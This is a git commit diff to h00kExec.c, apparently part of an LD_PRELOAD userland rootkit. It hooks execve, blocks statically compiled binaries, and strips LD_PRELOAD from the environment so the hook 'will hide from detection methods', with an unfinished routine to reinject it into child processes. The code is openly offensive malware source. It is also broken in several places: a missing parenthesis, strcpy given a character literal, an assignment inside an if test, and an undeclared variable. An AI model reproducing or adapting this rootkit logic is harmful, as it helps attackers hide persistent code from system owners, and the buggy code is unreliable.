bb4af359461838e37ed3970de72ea28495c7b564
landyy <rmb2555@rit.edu>
2017-03-22 08:46:05 -0400

    Added more to Exec

--- h00k/h00kExec.c
+++ h00k/h00kExec.c
@@ -1,39 +1,53 @@
 #define _GNU_SOURCE
-
+/*
+*@@@ landy @@@
+*Hooks execve and breaks static compiling. So far has basic features
+*that will hide from detection methods
+*
+*
+*/
 #include <stdlib.h>
 #include <stdio.h>
 #include <unistd.h>
 #include <string.h>
+#include <dlfcn.h>
 
 //grabs the env variables at linking time(?)
 extern char **environ;
 
 //sets the old execve
 int (*old_execve)(const char *filename, char *const argv[], char *const envp[]);
-char **newenvp;
+char *mypreload;
 
 //used to remove LD_PRELOAD when the library is loaded. We will load it back in 
 //at the end.
 void init(){
+	char ldvar[] = "LD_PRELOAD";
+
+	int ldlength = strlen(getenv(ldvar);
+	mypreload = malloc(ldlength + 1);
 	
+	//remove LD_PRELOAD from the enviorment variables
+	for(int i = 0; environ[i] != NULL; i++){
+		if(strstr(environ[i],ldvar)){
+			strcpy(environ[i],mypreload);
+
+			//this may not work *sigh* 
+			strcpy(environ[i], '\0');
+			free(environ[i]);
+		}
+	}
 	
 }
 
 int execve(const char *filename, char *const argv[], char *const envp[]){
 
 	char deflt[] = "LD_PRELOAD=";
+	char **newenvp;
+	int ldpos = 0;	
 
 	if(!old_execve){
 		old_execve = dlsym(RTLD_NEXT,"execve");		
-	}
-
-
-	//remove LD_PRELOAD for enviroment variables
-	for(int x = 0; envp[x] != NULL; x++){
-		if(strstr(envp[x], "LD_PRELOAD=")){
-			strcpy(envp[x], '\0');
-		
-		}
 	}
 	
 	//breaks static compiling
@@ -43,6 +57,23 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
 				errno = ETXBSY;
 				return -1;
 			}
+		}
+	}
+
+	//need to grab the size of the env vars
+	for(int x = 0; envp[x] != NULL; x++){
+		if(strstr(envp[x], deflt)){
+			ldpos = x;
+		}
+	}
+
+	//lets load LD_PRELOAD back in :)
+	newenvp = (char**)malloc((x+1)*sizeof(char*));
+
+	for(int y = 0;y < x; y++){
+		//load back LD_PRELOAD into the right spot
+		if(ldpos = 0){
+			//TODO		
 		}
 	}
 
